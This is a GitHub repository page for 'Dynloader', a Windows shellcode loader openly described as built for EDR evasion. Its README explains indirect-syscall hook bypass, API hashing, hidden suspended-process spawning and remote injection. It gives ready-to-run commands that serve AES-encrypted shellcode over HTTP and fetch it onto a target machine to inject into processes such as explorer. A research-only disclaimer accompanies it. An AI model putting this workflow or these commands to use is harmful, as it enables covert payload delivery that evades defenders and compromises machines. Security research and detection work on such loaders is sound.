# https://github.com/h4vox/Dynloader

[Skip to content](https://github.com/h4vox/Dynloader#start-of-content)

You signed in with another tab or window. [Reload](https://github.com/h4vox/Dynloader) to refresh your session.You signed out in another tab or window. [Reload](https://github.com/h4vox/Dynloader) to refresh your session.You switched accounts on another tab or window. [Reload](https://github.com/h4vox/Dynloader) to refresh your session.Dismiss alert

{{ message }}

[h4vox](https://github.com/h4vox)/ **[Dynloader](https://github.com/h4vox/Dynloader)** Public

- [Notifications](https://github.com/login?return_to=%2Fh4vox%2FDynloader) You must be signed in to change notification settings
- [Fork\\
7](https://github.com/login?return_to=%2Fh4vox%2FDynloader)
- [Star\\
81](https://github.com/login?return_to=%2Fh4vox%2FDynloader)


master

[**1** Branch](https://github.com/h4vox/Dynloader/branches) [**0** Tags](https://github.com/h4vox/Dynloader/tags)

[Go to Branches page](https://github.com/h4vox/Dynloader/branches)[Go to Tags page](https://github.com/h4vox/Dynloader/tags)

Go to file

Code

Open more actions menu

## Folders and files

| Name | Name | Last commit message | Last commit date |
| --- | --- | --- | --- |
| ## Latest commit<br>## History<br>[5 Commits](https://github.com/h4vox/Dynloader/commits/master/) <br>[View commit history for this file.](https://github.com/h4vox/Dynloader/commits/master/) 5 Commits |
| [Release](https://github.com/h4vox/Dynloader/tree/master/Release "Release") | [Release](https://github.com/h4vox/Dynloader/tree/master/Release "Release") |  |  |
| [lib](https://github.com/h4vox/Dynloader/tree/master/lib "lib") | [lib](https://github.com/h4vox/Dynloader/tree/master/lib "lib") |  |  |
| [loader](https://github.com/h4vox/Dynloader/tree/master/loader "loader") | [loader](https://github.com/h4vox/Dynloader/tree/master/loader "loader") |  |  |
| [tools](https://github.com/h4vox/Dynloader/tree/master/tools "tools") | [tools](https://github.com/h4vox/Dynloader/tree/master/tools "tools") |  |  |
| [README.md](https://github.com/h4vox/Dynloader/blob/master/README.md "README.md") | [README.md](https://github.com/h4vox/Dynloader/blob/master/README.md "README.md") |  |  |
| [build.bat](https://github.com/h4vox/Dynloader/blob/master/build.bat "build.bat") | [build.bat](https://github.com/h4vox/Dynloader/blob/master/build.bat "build.bat") |  |  |
| [loader.sln](https://github.com/h4vox/Dynloader/blob/master/loader.sln "loader.sln") | [loader.sln](https://github.com/h4vox/Dynloader/blob/master/loader.sln "loader.sln") |  |  |
| [loader.vcxproj](https://github.com/h4vox/Dynloader/blob/master/loader.vcxproj "loader.vcxproj") | [loader.vcxproj](https://github.com/h4vox/Dynloader/blob/master/loader.vcxproj "loader.vcxproj") |  |  |
| [server.sh](https://github.com/h4vox/Dynloader/blob/master/server.sh "server.sh") | [server.sh](https://github.com/h4vox/Dynloader/blob/master/server.sh "server.sh") |  |  |
| View all files |

## Repository files navigation

# Dynloader

[Permalink: Dynloader](https://github.com/h4vox/Dynloader#dynloader)

**Modular Windows loader using C++**

![](https://camo.githubusercontent.com/68633f76290fce59a1613cc1598a2241af702c3d2a20f092f7490a22789c58e4/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4c616e67756167652d432532422532422d626c7565)![](https://camo.githubusercontent.com/7c0e12da7a3cf2c5392f26d99bdfeef729f499f197fee5998c20ee0ff125ec2f/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4f532d57696e646f77732d626c7565)![](https://camo.githubusercontent.com/3df8a4bdaf6a6e6c8f3cdba74f0c660e321ff057ec5d14a4adf2eebee80de2be/68747470733a2f2f696d672e736869656c64732e696f2f62616467652f4d61696e7461696e65642d5965732d627269676874677265656e)

For Workaround Check -> **[Building](https://github.com/h4vox/Dynloader#Building)**, **[usage](https://github.com/h4vox/Dynloader#usage)** and **[testing / demo](https://github.com/h4vox/Dynloader#demo)**.

* * *

## Overview

[Permalink: Overview](https://github.com/h4vox/Dynloader#overview)

**Dynloader** is a research-oriented Windows loader for studying how payload is delivered, staged, and executed in both **local** and **remote** process contexts, the currect verison support only shellcode staging, Planned more implementation -> check out **[Planned features](https://github.com/h4vox/Dynloader#Planned-features)**.

**It can:**

> - Load shellcode from a local `.bin` file
> - Fetch shellcode **filelessly** over HTTP (optional AES-256-CBC at runtime)
> - Inject into a target by **PID** or **process name**
> - Spawn a missing process **headless** (suspended + hidden), inject, then resume

Core evasion and resolution primitives are provided by **[Dynveil](https://github.com/Abishekponmudi/dynveil)** (`lib/`) — a reusable library that implements PEB/PE parsing, API hashing, Tartarus Gate indirect syscalls, section mapping, AES crypto, and HTTP transport. Dynloader is the CLI + ingestion orchestration layer on top of Dynveil.

* * *

## Disclaimer

[Permalink: Disclaimer](https://github.com/h4vox/Dynloader#disclaimer)

This project is **for educational and research purposes only**.

It is designed to help understand:

- Windows PE internals
- Manual loading techniques
- Reverse engineering concepts

Do **not** use this software on systems you do not own or do not have explicit permission to test. The authors take no responsibility for misuse.

* * *

## Features

[Permalink: Features](https://github.com/h4vox/Dynloader#features)

- **Manual PE mapping / parsing** — PEB + LDR walk and export (EAT) resolution without normal `GetProcAddress` name strings
- **Indirect syscalls via Tartarus Gate** — SSN extraction with **Hell’s Gate / Halo’s Gate / HellHell** style recovery when stubs look hooked; invoke via ntdll `syscall; ret` gadget
- **Section mapping** — `NtCreateSection` \+ `NtMapViewOfSection` / unmap as alternate staging path
- **Dynamic API resolution** — resolve modules and exports at runtime through Dynveil
- **API hashing** — djb2 hashes; no plaintext API names for resolved exports
- **AES-256-CBC** — encrypt offline; decrypt at runtime (file or fileless key fetch)
- **Local & remote ingestion** — self-process run or inject into another process
- **Fileless HTTP server/client** — serve and pull payload + optional key material

* * *

## Evasion techniques

[Permalink: Evasion techniques](https://github.com/h4vox/Dynloader#evasion-techniques)

| Technique | Feature |
| --- | --- |
| **Manual PE Mapping** | Manual module + export resolution without `GetProcAddress` strings |
| **Indirect syscall via Tartarus Gate (Hell's, Halo's, HellHell)** | Indirect syscalls via ntdll `syscall; ret` gadget (bypasses usermode hooks on `Nt*` prologues). Halo’s Gate recovers SSNs when ntdll stubs are hooked |
| **API hashing** | Resolves exports by djb2 hash — no plaintext API names in the binary |
| **Section mapping** | `NtCreateSection` \+ `NtMapViewOfSection` as alternate staging backend |
| **Minimal IAT** | NT path via syscalls; Win32 only where needed (`CreateThread` / `CreateRemoteThread`, hashed) |
| **W^X staging** | `NtAllocateVirtualMemory` RW → write → `NtProtectVirtualMemory` RX (no RWX) |
| **Payload encryption AES-256-CBC** | Encrypted payload + dynamic key fetch (fileless) |
| **Fileless HTTP** | No payload file on disk at runtime — fetch from `/api/v1/payload` |
| **Headless spawn** | Target process started suspended + hidden before remote inject |

* * *

## Background — Dynveil

[Permalink: Background — Dynveil](https://github.com/h4vox/Dynloader#background--dynveil)

**[Dynveil](https://github.com/Abishekponmudi/dynveil)** is the shared research library under `lib/`. Dynloader does **not** reimplement every technique inline; it calls Dynveil modules for the heavy lifting.

**Repo:** [https://github.com/Abishekponmudi/dynveil](https://github.com/Abishekponmudi/dynveil)

What Dynveil provides:

- **Manual PE parser** — walk PEB → LDR lists, locate modules, walk the export address table
- **Dynamic API resolver** — hash-based export resolve (`kernel32`, `ntdll`, `bcrypt`, `ws2_32`, …)
- **Tartarus Gate** — SSN resolve (Hell’s / Halo’s / HellHell-style paths), build per-API **stubs**, jump to a shared ntdll **`syscall; ret` gadget**
- **Section map helpers** — create section, map view, protect, unmap, cleanup
- **Crypto** — AES-256-CBC key material, encrypt/decrypt, pack/unpack key blobs
- **HTTP transport** — minimal fileless client + in-memory server for lab delivery

* * *

## How it works

[Permalink: How it works](https://github.com/h4vox/Dynloader#how-it-works)

1. **Parse CLI** — mode: local / remote (`--process`) / fileless / server / encrypt / self-test.
2. **Init Dynveil syscalls** — Tartarus Gate builds SSNs + indirect stubs (shared ntdll gadget).
3. **Get shellcode**
   - **Disk:** read `.bin` (or ciphertext if decrypt path applies)
   - **Fileless:**`GET /api/v1/payload` and, if AES, `GET /api/v1/key` then decrypt at runtime
4. **Choose ingestion**
   - **`--process` set → remote**
   - **else → local**
5. **Local path**
   - Stage in current process with indirect Nt\* (prefer alloc RW → write → protect RX; section map fallback)
   - Execute with hash-resolved `CreateThread`, wait for exit
6. **Remote path**
   - Target by **PID** or **process name** (works with many normal user-session binaries; no `SeDebugPrivilege` elevation assumed)
   - Discover by name via **`NtQuerySystemInformation`** (SystemProcessInformation) over Tartarus Gate
   - If name not running → **headless spawn** (`CREATE_SUSPENDED` \+ no window), inject, **ResumeThread**
   - Open process: prefer **`NtOpenProcess`**, fallback hashed **`OpenProcess`**
   - Stage: `NtAllocateVirtualMemory` → `NtWriteVirtualMemory` → `NtProtectVirtualMemory` (RX)
   - Run: hash-resolved **`CreateRemoteThread`**
7. **Done** — local thread completes or remote thread is created; handles cleaned up.

Same staging/execution ideas apply whether bytes came from disk or from the fileless server.

* * *

## Building

[Permalink: Building](https://github.com/h4vox/Dynloader#building)

**Prerequisites:** Windows 10/11 x64, MSVC C++ toolchain (VS 2019/2022/18 or **Build Tools** with _Desktop development with C++_). Internet + admin only needed for first-time auto-install.

```
build.bat                 :: Release x64  →  x64\Release\loader.exe
build.bat debug           :: Debug x64
build.bat clean           :: Clean
build.bat --install       :: Install minimal VS Build Tools if missing, then build
```

> `build.bat` finds MSBuild via `vswhere`, picks a compatible toolset (`v145` / `v143` / `v142`), and builds `loader.sln`. On a machine with no compiler, `--install` pulls official Build Tools + C++ workload (winget or bootstrapper).

* * *

## Usage

[Permalink: Usage](https://github.com/h4vox/Dynloader#usage)

```
LOCAL
  loader.exe <file.bin> [--verbose]
  loader.exe --process <name|PID> <file.bin> [--verbose]
  loader.exe --enc AES <file.bin> [--verbose]

FILELESS
  loader.exe --fileless --source <host[:port]> [--verbose]
  loader.exe --fileless --source <host> --enc AES [--verbose]
  loader.exe --fileless --source <host> --process <name|PID> [--enc AES] [--verbose]

SERVER
  loader.exe --server <file.bin> [--port 8080] [--verbose]
  loader.exe --server --enc AES <file.bin> [--port 8080] [--verbose]
```

### HTTP endpoints (server)

[Permalink: HTTP endpoints (server)](https://github.com/h4vox/Dynloader#http-endpoints-server)

| Path | Purpose |
| --- | --- |
| `GET /api/v1/payload` | Shellcode (plain or ciphertext) |
| `GET /api/v1/key` | AES key material (when encrypted) |
| `GET /api/v1/health` | Health check |

* * *

## Demo

[Permalink: Demo](https://github.com/h4vox/Dynloader#demo)

### 1) Self-test

[Permalink: 1) Self-test](https://github.com/h4vox/Dynloader#1-self-test)

```
loader.exe --selftest --verbose
```

Checks PEB resolve, Tartarus init path, and AES roundtrip.

### 2) Local shellcode

[Permalink: 2) Local shellcode](https://github.com/h4vox/Dynloader#2-local-shellcode)

```
loader.exe payload.bin --verbose
```

### 3) Remote by process name

[Permalink: 3) Remote by process name](https://github.com/h4vox/Dynloader#3-remote-by-process-name)

```
loader.exe --process notepad payload.bin --verbose
```

> If `notepad` is not running, Dynloader spawns it headless, injects, resumes.
>
> - Target by **PID** or **process name** (e.g. `notepad` / `1234`) — supports many legitimate binaries in the same session without elevation (`!SeDebugPrivilege` not required for same-integrity targets)
> - Process discovery via **`NtQuerySystemInformation`** (SystemProcessInformation) over Tartarus Gate
> - If the named process is **not running** → spawn **headless** (`CREATE_SUSPENDED` \+ no window), inject, then resume
> - Remote stage: `NtAllocateVirtualMemory` → `NtWriteVirtualMemory` → `NtProtectVirtualMemory` (RX)
> - Remote run: hash-resolved `CreateRemoteThread`
> - Open target prefers `NtOpenProcess`, falls back to hashed `OpenProcess`

### 4) Remote by PID

[Permalink: 4) Remote by PID](https://github.com/h4vox/Dynloader#4-remote-by-pid)

```
loader.exe --process 4568 payload.bin --verbose
```

### 5) Encrypt + serve + fileless client

[Permalink: 5) Encrypt + serve + fileless client](https://github.com/h4vox/Dynloader#5-encrypt--serve--fileless-client)

**Terminal A — server** (host shellcode remotely):

```
loader.exe --server --enc AES payload.bin --port 8080 --verbose
```

**Terminal B — client** (target machine, local run):

```
loader.exe --fileless --source 127.0.0.1:8080 --enc AES --verbose
```

**Terminal B — client** (target machine, remote inject):

```
loader.exe --fileless --source 127.0.0.1:8080 --enc AES --process explorer --verbose
```

### 6) Offline encrypt only

[Permalink: 6) Offline encrypt only](https://github.com/h4vox/Dynloader#6-offline-encrypt-only)

```
loader.exe --enc AES payload.bin --verbose
```

Writes `.enc` \+ `.key` next to the input for lab packaging.

* * *

## Planned-features

[Permalink: Planned-features](https://github.com/h4vox/Dynloader#planned-features)

- **Manual PE loader** — full PE / DLL support alongside shellcode (`.bin`)
- **Manual DLL loader / remote DLL ingestion** — map and run DLLs in local or remote processes without relying only on raw shellcode blobs
- **Threadless execution** — move off classic thread APIs toward [thread pool](https://oioio-space.github.io/maldev/techniques/injection/thread-pool.html) based execution
- **Full section mapping** — prefer section-based staging over native thread-centric paths where possible
- **Section storming** — multi-section staging patterns for research labs
- **HTTPS encrypted channel** — harden fileless delivery from plain HTTP to HTTPS

* * *

## Project layout

[Permalink: Project layout](https://github.com/h4vox/Dynloader#project-layout)

```
.
├── loader/                 # Dynloader — CLI, modes, local/remote ingestion
│   ├── main.cpp
│   ├── cli.cpp / cli.hpp
│   ├── loader_core.cpp / loader_core.hpp
│   └── ingestion.cpp / ingestion.hpp
├── lib/                    # Dynveil — https://github.com/Abishekponmudi/dynveil
│   ├── common/             # hashes, logging, NT types
│   ├── pe/                 # PEB / PE / EAT parser
│   ├── resolve/            # dynamic API resolution
│   ├── syscall/            # Tartarus Gate indirect syscalls
│   ├── memory/             # section map + staging helpers
│   ├── crypto/             # AES-256-CBC
│   └── net/                # fileless HTTP client/server
├── tools/                  # helpers (e.g. hash dump)
├── server.sh               # optional server helper script
└── README.md
```

* * *

## Notes

[Permalink: Notes](https://github.com/h4vox/Dynloader#notes)

- Indirect syscalls cover Dynveil’s **Nt\*** table (memory, open, process enum, sections) — not every Win32 call.
- Local execute uses hashed `CreateThread`; remote uses hashed `CreateRemoteThread`.
- Fileless transport is plain HTTP today (lab-oriented); HTTPS is planned.

* * *

## License / ethics

[Permalink: License / ethics](https://github.com/h4vox/Dynloader#license--ethics)

Research & education only. Use on lab VMs you control. Stay legal.

## About

DynLoader A modular Windows loader focused on EDR evasion Built with indirect syscall (Tartarus Gate / Hell’s Gate), Manual PE parsing & Section mapping, API hashing & Dynamic resolution, fileless HTTP delivery (AES encrypted option)

### Resources

[Readme](https://github.com/h4vox/Dynloader#readme-ov-file)

[Activity](https://github.com/h4vox/Dynloader/activity)

### Stars

**81** stars

### Watchers

**0** watching

### Forks

[**7** forks](https://github.com/h4vox/Dynloader/forks)

[Report repository](https://github.com/contact/report-content?content_url=https%3A%2F%2Fgithub.com%2Fh4vox%2FDynloader&report=h4vox+%28user%29)

## Releases

## Packages

## Contributors

## Languages

You can’t perform that action at this time.